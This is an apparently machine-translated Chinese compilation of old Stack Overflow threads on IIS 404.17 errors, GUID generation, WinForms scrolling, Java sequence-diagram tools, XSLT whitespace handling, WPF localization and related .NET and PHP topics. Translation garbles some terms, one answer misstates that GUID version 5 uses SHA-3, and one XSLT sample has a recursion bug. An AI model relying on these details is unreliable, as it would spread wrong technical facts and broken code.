我在 Win Server 2k8 下的 IIS 7 上设置了一个新的 .net 2.0 网站，当浏览到一个页面时，它给了我一个 404.17 错误，声称该文件（在这种情况下为 default.aspx）似乎是一个脚本，但正在由静态文件处理程序处理。听起来 ASP.Net 的模块映射搞砸了，但它们在配置中看起来不错。有没有人有纠正这个错误的建议？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2008-09-17T20:38:57.867

有一次我在 IIS6 上遇到了这个问题，当时不知何故 ASP.NET ISAPI 的东西被破坏了。

跑步

```
%windir%\Microsoft.NET\Framework\v2.0.50727\aspnet_regiis.exe -i 
```

重新创建设置照顾它。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2010-03-18T22:06:46.473

这个解决方案对我有用......（我有 aspnet_regiis.exe -我造成了一些损害）

[http://forums.iis.net/t/1157725.aspx](http://forums.iis.net/t/1157725.aspx)

```
1.找到您的应用程序池并右键单击
2.选择基本设置
3\. 选择您当前的 .Net Framework 版本
4.重启应用程序池
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-12-12T03:30:47.860

对我来说，它通过执行以下操作来工作

安装 ASP.NET

```
cd %windir%\Microsoft.NET\Framework64/v4.0.30319
aspnet_regiis.exe -i 
```

*   下一步转到 IIS 管理器并单击服务器（根）节点。
*   在功能视图中，IIS 部分，打开“ISAPI & CGI Restrictions”
*   右键单击 ASP.NET 4 限制列并右键单击以允许

希望对你有帮助..

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2010-08-11T19:20:14.830

对我来说，我的问题是因为我的项目的 web.config 文件中的设置（以及解决方案，一旦我理解了问题）。

*在我的 web.config 文件中，我们在system.webServer > handlers*区域中有这两行：

```
<remove name="WebServiceHandlerFactory-ISAPI-2.0" />
<add name="ScriptHandlerFactory" verb="*" path="*.asmx" preCondition="integratedMode" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" /> 
```

请注意，替代处理程序具有属性“preCondition="integratedMode"”。因此，我不得不将我的 AppPool 更改为使用**Integrated**而不是**Classic**进行**管道模式**设置（这与上述解决方案告诉我的做法相反）。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2011-07-20T16:13:02.140

始终首先在处理程序映射中尝试“恢复为父级”。

尝试在 IIS 7.5 中运行 ASP.NET 4.0 时，我得到了 404.17。我尝试了以上所有方法，最终手动设置了正确的处理程序映射，错误消失了。

然后，在另一个出现相同错误的网站上，我在 Handler Mappings 中尝试了“Revert to Parent”，它添加了 6 个 *.aspx 映射，一切正常。

显然，您必须正确配置父级（从安装或其他方式），但这绝对是每个人都应该采取的第一步，因为它非常简单。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2011-06-24T16:40:50.873

对我来说，解决方案是从虚拟应用程序下的处理程序映射部分单击“从继承中恢复”。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2010-08-10T23:41:04.323

到目前为止，这些解决方案都不适合我。

我找到了其他一些可能的解决方案（对我不起作用）：

*   [http://first-reboot.blogspot.com/2009/12/error-40417-opening-asmx-page.html](http://first-reboot.blogspot.com/2009/12/error-40417-opening-asmx-page.html)
*   [http://forums.asp.net/p/1432329/3219236.aspx](http://forums.asp.net/p/1432329/3219236.aspx)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2010-09-06T06:35:45.210

只有一种方法可以解决这个问题......

首先安装 Windows7 然后安装具有所有功能的 IIS 7

然后安装 Visual Studio 2008 / 2010

我在 Visual Studio 2008 和 2010 上工作，但我以前从未见过这个错误。

我也可以在我朋友的电脑上试试。我也解决了这个错误。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-05-30T02:48:29.390

对我来说，这可以通过将 32 位应用程序设置为 true 来解决。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2011-06-10T11:11:27.043

以上都不对我有用。我们的服务器是 64 位的，因此将应用程序设置为允许 32 位应用程序为我们工作：

*   转到 Web 服务器\应用程序池
*   右键单击您的网站使用的应用程序池。
*   点击高级设置...
*   将“启用 32 位应用程序”设置为 True。

我认为这是因为 Web 应用程序仅编译为 32 位。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2011-07-26T15:43:48.607

```
%windir%\Microsoft.NET\Framework64\v2.0.50727\aspnet_regiis.exe -i 
```

在使用 32 框架获得“尝试加载格式不正确的程序......”后为我工作

也许我会再节省你一秒钟的谷歌搜索时间

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2012-07-31T09:09:18.470

对我来说，[这](http://knowledgebaseworld.blogspot.ro/2010/04/http-error-40417-not-found-with-iis7.html "http://knowledgebaseworld.blogspot.ro/2010/04/http-error-40417-not-found-with-iis7.html")行得通。安装机器配置部分、处理程序、程序集、模块、协议和许多其他东西以正常工作。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-10-21T12:59:44.403

对我来说，服务器功能中没有检查 HTTP 激活。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2015-07-08T15:56:48.503

我们需要在 IIS 开发功能下的 Windows 功能菜单中安装 ASP.NET 3.5 和 4.5、ISAPI 扩展、ISAPI 过滤器和服务器端包含。

或者，使用命令行 DISM：

```
Dism /online /enable-feature /featurename:NetFx3 /All /Source:WindowsInstallers\Win8\sxs /LimitAccess
Dism /online /enable-feature /featurename:NetFx4 /All /Source:WindowsInstallers\Win8\sxs /LimitAccess
Dism /online /enable-feature /featurename:IIS-ISAPIExtensions /All /Source:WindowsInstallers\Win8\sxs /LimitAccess
Dism /online /enable-feature /featurename:IIS-ISAPIFilter /All /Source:WindowsInstallers\Win8\sxs /LimitAccess
Dism /online /enable-feature /featurename:IIS-ServerSideIncludes /All /Source:WindowsInstallers\Win8\sxs /LimitAccess 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-12-17T05:58:36.563

WCF 服务下的 http 激活在打开/关闭 windows 功能时解决了该问题。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2017-10-09T14:02:34.303

就我而言，以上答案都没有解决问题，原因**是没有安装 CGI 模块**。

为了解决这个问题，我遵循了这些说明。

[https://docs.microsoft.com/en-us/iis/configuration/system.webserver/cgi](https://docs.microsoft.com/en-us/iis/configuration/system.webserver/cgi)

# guid - GUID 幕后

> ID：87127
> 
> 赞同：4
> 
> 时间：2008-09-17T20:13:01.937
> 
> 标签：guid

我想知道，创建 GUID 的内容是什么。我的意思不是用于以特定语言创建 GUID（SQL Server 中的 NewID()，C# 中的 Guid.NewGuid()），我的意思是当您调用这些方法/函数时，它们会做什么来制作图形用户界面？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:16:28.123

此外，[RFC 4122](http://www.ietf.org/rfc/rfc4122.txt)（在 Wikipedia 文章中引用）描述了应该如何构建 GUID。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:14:32.060

[wikipedia](http://en.wikipedia.org/wiki/Globally_Unique_Identifier)上描述了 GUID 的详细信息，包括用于生成它们的算法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T20:40:46.800

简而言之，它一点也不复杂。**GUID**（或 UUID）版本 4（当前）**是一个**部分**随机数**，简单明了（128 位中有 122 位是随机的，其余用于存储版本和修订）。诀窍是这个数字的可能值非常多，以至于对于大多数实际目的来说，**命中的概率****为零**。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:15:08.283

哈希函数。情况很复杂。

[http://en.wikipedia.org/wiki/GUID#Algorithm](http://en.wikipedia.org/wiki/GUID#Algorithm)比我知道的多。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:21:58.593

请注意，您在 Internet 上阅读的有关 GUID 创建的大量内容很可能是错误的，或者至少对于您的特定平台来说已经过时了。

我曾经单步执行一堆 Windows 代码来解决有关在 WinXP 上创建 GUID 的争论。不幸的是，事实证明我错了（即我失去了论点），但拉里奥斯特曼也是如此，所以我对此感觉稍微好一些。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-08-19T14:56:10.273

生成 GUID 的官方方法有五种（当然还有更多非官方方法）。

*   版本 1 是基于时间的 GUID，通常使用用于计算 GUID 的主网卡的 MAC 地址。由于隐私问题，这通常不使用，但我确实相信 2005 年及以后的 Microsoft SQL Server 使用此版本的修改版本（声称是版本 14），以创建对数据库中的 id 有用的顺序 GUID，以避免分割数据块 (NewSequentialId())。

*   版本 2 是 DCE 安全版本。我从来没有找到过这种 GUID，但我也没有经常使用 POSIX，而且版本 2 GUID 和 POSIX 之间似乎存在联系。

*   版本 3 是“基于名称”的版本，这意味着您可以获取一个文本并创建一个 GUID 表示，给定一个命名空间。版本 3 使用 MD5 散列算法。另见版本 5。

*   版本 4 基本上是一个随机数类型的 GUID。随机数具有顺序级别，而不仅仅是您的平均随机数生成器。这是当今世界上通常使用的版本。根据 Microsoft 文档，C# Guid.NewGuid() 使用此版本。此外，用于在 MS SQL Server (NewId()) 中生成唯一标识符的常规函数​​会生成版本 4 GUID。

*   版本 5 与版本 3 类似，但使用 SHA-3 散列算法。扩展的[guid C# 项目](http://guidex.codeplex.com/)使用版本 5 算法。

对于 GUID 制作的一种实现，我建议查看扩展的 guid 项目。正如许多人指出的那样，[RFC 4122](http://www.ietf.org/rfc/rfc4122.txt)详细描述了所有五种算法的工作原理。但是，不能保证所有实现都是正确的。

# c# - C# ListView 鼠标滚轮滚动无焦点

> ID：87134
> 
> 赞同：13
> 
> 时间：2008-09-17T20:13:56.973
> 
> 标签：c#, .net, listview, scroll

我正在制作一个将 ListView 设置为详细信息的 WinForms 应用程序，以便可以显示几列。

当鼠标悬停在控件上并且用户使用鼠标滚轮时，我希望此列表滚动。现在，滚动只发生在 ListView 有焦点时。

即使没有焦点，如何使 ListView 滚动？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-09-12T21:11:23.133

“简单”和有效的解决方案：

```
public class FormContainingListView : Form, IMessageFilter
{
    public FormContainingListView()
    {
        // ...
        Application.AddMessageFilter(this);
    }

    #region mouse wheel without focus

    // P/Invoke declarations
    [DllImport("user32.dll")]
    private static extern IntPtr WindowFromPoint(Point pt);
    [DllImport("user32.dll")]
    private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);

    public bool PreFilterMessage(ref Message m)
    {
        if (m.Msg == 0x20a)
        {
            // WM_MOUSEWHEEL, find the control at screen position m.LParam
            Point pos = new Point(m.LParam.ToInt32() & 0xffff, m.LParam.ToInt32() >> 16);
            IntPtr hWnd = WindowFromPoint(pos);
            if (hWnd != IntPtr.Zero && hWnd != m.HWnd && System.Windows.Forms.Control.FromHandle(hWnd) != null)
            {
                SendMessage(hWnd, m.Msg, m.WParam, m.LParam);
                return true;
            }
        }
        return false;
    }

    #endregion
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:22:39.030

您通常只会在获得焦点时将鼠标/键盘事件发送到窗口或控件。如果您想在没有焦点的情况下看到它们，那么您将不得不放置一个较低级别的钩子。

[这是一个示例低级鼠标钩子](https://web.archive.org/web/20190831061836/https://blogs.msdn.microsoft.com/toub/2006/05/03/low-level-mouse-hook-in-c/)

# java - 序列图逆向工程

> ID：87137
> 
> 赞同：29
> 
> 时间：2008-09-17T20:14:13.730
> 
> 标签：java, uml, reverse-engineering, sequence-diagram

我正在寻找一种工具，可以将 Java 逆向工程成序列图，但也提供过滤掉对某些库的调用的能力。

例如，Netbeans IDE 在这方面做得非常出色，但它包括对 String 或 Integer 的所有调用，这会使图表混乱到无法使用的程度。

任何帮助是极大的赞赏！！！！！！！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-09-21T01:14:53.270

我认为[jtracert](http://code.google.com/p/jtracert/)是您正在寻找的。它从正在运行的 Java 程序生成序列图。此外，由于它的输出是图表的文本描述（采用几种流行的 SD 工具的格式），您可以使用 grep 仅过滤您感兴趣的类。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-02-07T19:30:17.427

尝试[维护](http://maintainj.com)J。MaintainJ 在运行时为用例生成序列图。它提供了[多种方法来过滤掉不需要的电话](http://maintainj.com/userGuide.jsp?param=faq#filtergetset)。是的，过滤掉不需要的调用是序列图生成工具中最重要的功能。此外，MaintainJ 提供了一个简洁的界面来探索图表并在一个用例或跨用例中搜索调用。

查看[演示视频](http://maintainj.com/userGuide.jsp?param=overviewDemo)以获得快速概览。

顺便说一句，我是MaintainJ的作者。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-09-24T23:45:37.193

我相信解决您问题的完美工具是 Diver: Dynamic Interactive Views For Reverse Engineering。它提供静态和动态序列图，并希望从您的问题中解决您的所有要求。

它是 Eclipse 的插件，可让您：

*   轻松跟踪您的 Java 程序
*   可视化程序的运行时功能
*   过滤你的痕迹，使它们更紧凑
*   根据运行时发生的情况过滤您的 IDE
*   查看源代码编辑器中运行的代码

它在[Github](https://github.com/thechiselgroup/Diver)上，还有一个[项目网站](http://eclipsediver.wordpress.com)

全面披露：我是 Diver 目前的项目负责人

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2010-08-27T13:42:04.543

JTracert 现已停产。到位，他们推荐[http://www.jsonde.com/](http://www.jsonde.com/)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2010-04-19T19:43:13.260

我有一个完全符合您要求的工具。看看这个

[http://sourceforge.net/projects/javacalltracer/](http://sourceforge.net/projects/javacalltracer/)

除了作为 Java 的逆向工程工具之外，它还非常轻量级。您可以从您的 java 程序中控制要记录的内容。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-09-23T09:59:06.270

[Sparx](http://www.sparxsystems.com/)的企业架构师 声称能够对 Java 代码进行逆向工程，包括生成序列图 - 请参阅[用户指南的这一部分](http://www.sparxsystems.com.au/EAUserGuide/index.html?generating_sequence_diagrams.htm)

看起来它可以记录一个调试会话，然后你从中生成序列图

我没有尝试过（虽然使用 EA 作为建模工具）所以 ymmv！

提供 30 天免费评估下载

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-17T21:30:27.117

看看[http://www.maintainj.com](http://www.maintainj.com)

它不知道它是否可以过滤库调用，但它具有合理的图形前端，并且似乎可以跟踪非常大的应用程序。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-05-14T14:44:39.127

MaintainJ 是一个非常棒的工具，最近我开始在我的应用程序中使用 MaintainJ，它让我在整个使用过程中更加舒适，以了解我基于 Maintainj 序列和 UML 图的系统。

我相信对于上述问题，MaintainJ 会给出更好的主意。谢谢，克里希纳MM

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2010-01-07T13:32:47.783

我刚刚开始使用 Sparx Systems Enterprise Architect 中的序列图记录功能。它适用于 C#。您可以按类和方法创建过滤器。我实际上是在尝试找出是否可以过滤掉整个包裹。有一个用于自动排除外部模块（如 .NET Framework）的复选框，有助于整理。YMMV for Java，但我认为他们对 Java 的支持（和文档）通常比 .NET 更好（更多示例）。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-05-13T17:47:23.443

Heatlamp ( [http://www.jmolly.com/heatlamp/](http://www.jmolly.com/heatlamp/) ) 正是为此目的而设计的。

它从运行的 Java 代码生成交互式（和可打印）图表。您可以指定过滤器来描述要跟踪的类、包和方法。您还可以在图表呈现后搜索、过滤和折叠调用，以进一步减少序列图。

免责声明：我是 Heatlamp 的作者。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-02-07T16:12:35.387

这是 Asgeir 答案的附加内容。这是我找到的链接。

[http://www.java2s.com/Code/Jar/s/sequence.htm](http://www.java2s.com/Code/Jar/s/sequence.htm)

从命令行运行...“java -jar sequence.jar”...这是一个带有 GUI 的 Java 应用程序。

帮助部分说： SEQUENCE 是一个用于生成 UML 序列图的程序。与大多数类似的程序相比，您实际上并没有绘制图表。相反，您编写要绘制图表的方法调用的文本描述，并自动计算和绘制布局。

所以这个工具不会对任何东西进行逆向工程，但是如果您想从头开始快速绘制图表，我可以看到它可能会有所帮助。看起来它是在 2002 年构建的，我认为现在可能有更好的工具。

这是另一个类似的工具：http: [//sdedit.sourceforge.net/example/index.html](http://sdedit.sourceforge.net/example/index.html)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-02-11T16:51:14.830

这看起来像一个非常好的工具： [http ://www.architexa.com/learn-more/sequence-diagrams](http://www.architexa.com/learn-more/sequence-diagrams)

但看起来它只免费一年，然后每年 250 美元。真可惜。

* * *

我发现 ModelGoon 插件很有帮助。它有点受限，因为您选择一个方法作为序列图的起点，并且它只显示该方法进行的调用（因此要更深入，您需要生成另一个图表。）

[http://www.modelgoon.org/?page_id=53](http://www.modelgoon.org/?page_id=53)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-01-30T21:37:38.863

JIVE (www.cse.buffalo.edu/jive) 将从 Java 程序的执行中构造一个序列图。它具有排除过滤器功能，允许您排除属于指定类或包的对象。JIVE 可以为多线程 Java 程序执行绘制序列图。它还具有在用户指导下在水平和垂直维度上压缩大型图表的能力。

# enterprise-library - WCSF 随机程序集清单定义与 .NET 2.0 中的程序集引用不匹配

> ID：87168
> 
> 赞同：1
> 
> 时间：2008-09-17T20:17:44.733
> 
> 标签：enterprise-library, wcsf

我在 2008 年 2 月与 Enterprise Library 3.1 一起运行 WCSF，并注意到我随机获得了“乐趣”

*无法加载文件或程序集 Microsoft.Practices.EnterpriseLibrary.Common，Version=3.1.0.0，Culture=neutral，Public ... 找到的程序集的清单定义与程序集引用不匹配。*

通常这在stackoverflow上不值得一提，但奇怪的是，我第一次启动它时它会中断，但如果我关闭它并再次按下F11 - 它可以工作......奇怪。有谁知道为什么这有时会中断，但其他人不会？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-19T18:57:48.973

问题与我添加的数据访问 DLL 版本有关。我发现如果我去以下：

> C:\Program Files\Microsoft Web Client Software Factory February 2008\Microsoft Practices Library

并导入了这个特定的数据访问 DLL，而不是我自己从 Enterprise Library 3.1 安装程序编译的那个，一切都很好。

# xslt - 如何在仍然换行的同时保留数据中的换行符、制表符和空格？

> ID：87177
> 
> 赞同：2
> 
> 时间：2008-09-17T20:18:19.210
> 
> 标签：xslt

我有 XML 中的数据，其中包含我想在输出 HTML 中保留的换行符、空格和制表符（所以我不能使用 <p>），但我还希望在到达屏幕一侧时换行（所以我不能使用 <pre>）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-18T13:51:18.633

另一种说法是，您要将所有成对的空格转换为两个不间断的空格，将制表符转换为四个不间断的空格，并将所有换行符转换为`<br>`元素。在 XSLT 1.0 中，我会这样做：

```
<xsl:template name="replace-spaces">
  <xsl:param name="text" />
  <xsl:choose>
    <xsl:when test="contains($text, '  ')">
      <xsl:call-template name="replace-spaces">
        <xsl:with-param name="text" select="substring-before($text, '  ')"/>
      </xsl:call-template>
      <xsl:text>&#xA0;&#xA0;</xsl:text>
      <xsl:call-template name="replace-spaces">
        <xsl:with-param name="text" select="substring-before($text, '  ')" />
      </xsl:call-template>
    </xsl:when>
    <xsl:when test="contains($text, '&#x9;')">
      <xsl:call-template name="replace-spaces">
        <xsl:with-param name="text" select="substring-before($text, '&#x9;')"/>
      </xsl:call-template>
      <xsl:text>&#xA0;&#xA0;&#xA0;&#xA0;</xsl:text>
      <xsl:call-template name="replace-spaces">
        <xsl:with-param name="text" select="substring-before($text, '&#x9;')" />
      </xsl:call-template>
    </xsl:when>
    <xsl:when test="contains($text, '&#xA;')">
      <xsl:call-template name="replace-spaces">
        <xsl:with-param name="text" select="substring-before($text, '&#xA;')" />
      </xsl:call-template>
      <br />
      <xsl:call-template name="replace-spaces">
        <xsl:with-param name="text" select="substring-after($text, '&#xA;')" />
      </xsl:call-template>
    </xsl:when>
    <xsl:otherwise>
      <xsl:value-of select="$text" />
    </xsl:otherwise>
  </xsl:choose>
</xsl:template> 
```

不能使用尾递归有点痛苦，但除非文本*很*长，否则它不应该是一个真正的问题。

XSLT 2.0 解决方案将使用`<xsl:analyze-string>`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T20:32:09.397

不确定这是否相关，但没有preservespace 属性和xml 之类的吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:20:40.517

我和一位同事（Patricia Eromosele）想出了以下解决方案：（有更好的解决方案吗？）

```
    <p> 
                    <xsl:call-template name="prewrap"> 
                      <xsl:with-param name="text" select="text"/> 
                    </xsl:call-template> 
    </p> 

    <xsl:template name ="prewrap"> 
     <xsl:param name="text" select="."/> 
     <xsl:variable name="spaceIndex" select="string-length(substring-before($text, ' '))"/ > 
     <xsl:variable name="tabIndex" select="string-length(substring-before($text, '	'))"/> 
     <xsl:variable name="lineFeedIndex" select="string-length (substring-before($text, '
'))"/>
     <xsl:choose> 
       <xsl:when test="$spaceIndex = 0 and $tabIndex = 0 and $lineFeedIndex = 0"><!-- 没有特殊字符-->
           <xsl:value-of select="$text"/> 
       </xsl:when> 
       <xsl:when test="$spaceIndex > $tabIndex and $lineFeedIndex > $tabIndex"><!-- tab --> 
         <xsl :value-of select="substring-before($text, '	')"/> 
         <xsl:text disable-output-escaping="yes">&nbsp;</xsl:text> 
         <xsl :text disable-output-escaping="yes">&nbsp;</xsl:text> 
         <xsl:text disable-output-escaping="yes">&nbsp;</xsl:text> 
         <xsl:text disable-output-escaping="yes">&nbsp;</xsl:text> 
         <xsl:call-template name="prewrap"> 
           <xsl:with-param name="text" select="substring-after($text,'	')"/> 
         </xsl:call-template> 
       </xsl:when>
       <xsl:when test="$spaceIndex > $lineFeedIndex and $tabIndex > $lineFeedIndex"><!-- 换行 --> 
         <xsl:value-of select="substring-before($text, '
 ')"/> 
         <br/> 
         <xsl:call-template name="prewrap"> 
           <xsl:with-param name="text" select="substring-after($text,'
')" /> 
         </xsl:call-template> 
       </xsl:when> 
       <xsl:when test="$lineFeedIndex > $spaceIndex and $tabIndex > $spaceIndex"><!-- 两个空格 --> 
         <xsl:value-的 select="substring-before($text, ' ')"/> 
         <xsl:text disable-output-escaping="yes">&nbsp;</xsl:text> 
         <xsl:text disable-output-escaping="yes">&nbsp;</xsl:text> 
         <xsl:call-template name="prewrap">
           <xsl:with-param name="text" select="substring-after($text,' ')"/> 
         </xsl:call-template> 
       </xsl:when> 
       <xsl:otherwise><!--永远不会发生 --> 
           <xsl:value-of select="$text"/> 
       </xsl:otherwise> 
     </xsl:choose> 
    </xsl:template>
```

来源：http: [//jamesjava.blogspot.com/2008/06/xsl-preserving-line-feeds-tabs-and.html](http://jamesjava.blogspot.com/2008/06/xsl-preserving-line-feeds-tabs-and.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:25:03.780

真的，我会选择一个正确支持这一点的编辑器，而不是通过更多的 XML 来解决它。

# deployment - Dot Net Nuke 模块有哪些好的模块开发解决方案/环境/最佳实践

> ID：87179
> 
> 赞同：4
> 
> 时间：2008-09-17T20:18:31.283
> 
> 标签：deployment, dotnetnuke, collaboration, dotnetnuke-module

从版本 2 开始，我一直在为 DNN 开发模块，那时我能够在我的环境中开发它时轻松地运行我的模块，并且仍然可以轻松地将我的模块部署为 DLL。当版本 4 出现并使用网站解决方案（而不是 Web 应用程序解决方案）时。好像丢了什么东西。我可以继续在我的测试环境中进行开发，并在我做出更改时立即看到更改，但发布对我来说已经变得很头疼。

我主要为一个站点进行开发，特别是在完成更改后，我刚刚使用 FTP 将模块部署到主站点。

我想为多个开发人员建立一个能够在模块上工作的良好环境。

在将东西添加到源代码控制时，人们通常是将所有 DNN 都放入源代码控制中，以便他们可以将整个解决方案投入使用，还是只是他们的模块并且每个人都需要设置自己的开发 DNN 环境？

我想开始组织我的模块项目，以便更多人可以在它们上工作，我对一些最佳实践感到有点迷茫，无论是在这样做还是将这些更改部署到实时站点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:31:51.487

我的博客网站[mitchelsellers.com](http://www.mitchelsellers.com)上有一些关于此的详细博客文章。

我个人使用 WAP 开发模型，我不会将 DNN 解决方案或任何核心文件检查到源代码控制中，因为我不会为我的任何客户修改核心。当与多人一起工作时，我们为每个人创建一个类似的环境，并且仍然可以处理我们的每个单独的项目，有时我们将拥有具有单独数据库和代码的完全隔离的开发环境，有时我与一个共享的开发人员一起工作数据库来解决开发模块安装问题。

对于 WAP 模型，我使用一种方法在项目构建时使用构建后事件动态创建我的安装包，然后我有一个测试安装，用于验证这些包是否发生。然后通过附加到进程进行调试。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-22T21:41:06.780

如果您需要一些参考资料，我会建议 Mitchel 书 - Wrox [Module Programming 的 Professional Dotnetnuke Module Programming - Michel Sellers](https://rads.stackoverflow.com/amzn/click/com/0470171162 "模块编程")

# wpf - 本地化 WPF 应用程序的最佳方法是什么，没有 LocBAML？

> ID：87184
> 
> 赞同：21
> 
> 时间：2008-09-17T20:19:17.227
> 
> 标签：wpf, xaml, localization, globalization

似乎没有本地化 WPF 应用程序的好方法。MSDN 似乎认为用`x:Uid`'s 乱扔我的 XAML，生成 CSV 文件，然后生成新的程序集（使用他们的示例代码！）就是答案。更糟糕的是，此过程没有解决如何本地化图像、二进制 blob（例如 PDF 文件）或嵌入代码中的字符串。

那么，您如何本地化一个应用程序：

1.  包含几个程序集
2.  包含需要本地化的图像和其他二进制 blob（例如：PDF 文档）
3.  具有不在 XAML 中的字符串数据（例如`MessageBox.Show("Hello World");`：）

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-07-02T18:57:30.420

您应该在[此处](http://wpflocalization.codeplex.com/)查看文章和代码。它描述了本地化 WPF 应用程序的不同方法，使用 LocBaml、自定义标记扩展或附加属性。恕我直言，最好的解决方案是使用标记扩展和 Resx 资源。该代码包含一个用于执行此操作的本地化框架。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-09-17T20:44:39.240

这里不是专家，但是用 x:Uids “乱扔”你的 xaml 并不比用你必须为本地化它们做的所有字符串表废话“乱扔”你的 Windows 窗体代码更糟糕。

据我了解，WPF 应用程序仍然支持“所有框架 CLR 资源，包括字符串表、图像等”。这意味着您可以拥有本地化的资源。

当然，如果您创建一个标记扩展来为您处理大部分此类废话，那会简单得多。 [您可以在此处找到某人执行此操作的示例。](https://web.archive.org/web/20071123214559/http://blogs.microsoft.co.il/blogs/tomershamam/archive/2007/10/30/wpf-localization-on-the-fly-language-selection.aspx) 还有另一个类似的解决方案`http://blog.taggersoft.com/2008/07/wpf-application-localization-pattern_29.html`，但该链接不再有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-07-02T18:45:17.200

您可以使用支持您提到的所有场景的旧“ResX”文件。此处解释了如何在 WPF 应用程序中完成此操作：

[WPF 应用程序框架 (WAF)](http://waf.codeplex.com) => 查看本地化示例

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2011-02-02T14:09:37.030

尝试 Gnu GetText 实用程序和支持应用程序。它确实基于 ResourceManager 和 ResourceSets[生成 C#](http://www.gnu.org/software/hello/manual/gettext/C_0023.html)类，当然您可以将翻译重用于应用程序的其他部分 - 例如网页、本机代码或 iphone 等。

# c# - .NET 库，用于处理 HTML 电子邮件和剥离以前的响应

> ID：87190
> 
> 赞同：4
> 
> 时间：2008-09-17T20:20:06.337
> 
> 标签：c#, .net, html, email

有谁知道将处理 HTML 电子邮件并可用于修剪回复链的 .NET 库？它需要能够接受 HTML 或文本邮件，然后删除除实际响应之外的所有内容，删除不是原始内容的邮件痕迹。我不希望它能够在它们交错到上一封邮件时处理响应（“在线响应”） - 这种情况可能会失败。

我们有一个基于 SgmlReader 和一系列 XSL 转换的自制程序，但它需要不断维护以处理新的电子邮件客户端。我想找一个我可以买的... :)

谢谢，史蒂夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-01T14:54:21.287

我们用来处理 HTML（包括格式错误的 HTML）的一个免费且非常有用的库是[HtmlAgilityPack](http://www.codeplex.com/htmlagilitypack)。

没有 StripOutPreviousResponses() 函数，但它可以帮助您自制一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-18T04:43:31.587

这并不能回答您的大部分问题，但是 W3C 的[将 HTML 转换为其他格式](http://www.w3.org/Tools/html2things.html)有一个关于将 HTML 转换为文本的部分。我希望它可以帮助某人为您的问题制定完整的答案！

# php - 什么时候需要使用后期静态绑定？

> ID：87192
> 
> 赞同：8
> 
> 时间：2008-09-17T20:20:32.560
> 
> 标签：php, oop

在阅读了后期静态绑定 (LSB) 的[描述](http://www.colder.ch/news/08-24-2007/28/late-static-bindings-expl.html)后，我很清楚地看到了发生了什么。现在，在哪种情况下这可能最有用或最需要？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-17T20:34:53.740

对于以下场景，我需要 LSB：

*   想象一下，您正在构建一个“邮件处理器”守护进程，它从电子邮件服务器下载邮件，对其进行分类、解析、保存，然后根据邮件的类型执行一些操作。
*   类层次结构：您有一个基本 Message 类，具有子“BouncedMessage”和“AcceptedMessage”。
*   每种消息类型都有自己的方式将自己持久保存在磁盘上。例如，所有 BouncedMessage 类型的消息都尝试将自身保存为 BouncedMessage-id.xml。另一方面，AcceptedMessage 需要以不同的方式保存自己 - 作为 AcceptedMessage-timestamp.xml。这里重要的是确定文件名模式的逻辑对于不同的子类是不同的，但对于子类中的所有项目都是**共享的。**这就是为什么它在静态方法中是有意义的。
*   基本消息类有一个抽象静态方法（是的，抽象*和*静态）“保存”。BouncedMessage 使用具体的静态方法来实现此方法。然后，在实际检索消息的类中，您可以调用“::save()”

如果您想了解有关该主题的更多信息：

*   [http://www.qcodo.com/forums/topic.php/2356](http://www.qcodo.com/forums/topic.php/2356)
*   [http://community.livejournal.com/php/585907.html](http://community.livejournal.com/php/585907.html)
